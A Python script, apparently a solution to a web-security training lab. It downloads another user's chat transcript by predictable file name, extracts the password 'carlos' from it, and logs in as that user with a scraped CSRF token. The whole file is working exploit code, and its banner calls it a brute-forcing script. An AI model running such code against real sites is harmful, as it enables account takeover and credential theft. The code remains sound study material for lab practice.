import requests,argparse,urllib3,sys,re
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def get_csrf_token(s, url):
    r =get_method(s,url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def get_method(s,url):
    try:
        r=s.get(url,verify=False, proxies=proxies)
        return r
    except Exception as e:
        print(colored(e,'red'))
def post_method(s,url,data):
    try:
        r=s.post(url,verify=False, proxies=proxies,data=data)
        return r 
    except Exception as e:
        print(colored(e,'red'))

def retrive_carlos_password(s, url):
    chat_url = url + "/download-transcript/1.txt"
    r=get_method(s,chat_url)
    
    if 'password' in r.text:
        
        carlos_password = re.findall(r'password is (.*)\.', r.text)
        print("(+) Found Carlos's password ==> "+colored(carlos_password[0],'red'))
        return carlos_password[0]
    else:
        print(colored("(-) Could not find Carlos's password.",'red'))
        sys.exit(-1)

def carlos_login(s, url):
    # retrive_carlos_password
    password=retrive_carlos_password(s,url)

    # Get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the carlos user
    
    data_login = {"username": "carlos", "password": password, "csrf": csrf_token}
    print(colored("(+) Logging in as the Carlos user...",'blue'))
    r = post_method(s,url=login_url, data=data_login)
 
    if "carlos" in r.text:
        print(colored("(+) Successfully logged in as the carlos user.",'green'))
    else:
        print(colored("(-) Could not login as the Carlos user.",'red'))
        sys.exit(-1)

def main():

    banner(name='broken access')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    carlos_login(s,url)
    
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+colored(a,'yellow'))


if __name__ == "__main__":
    main()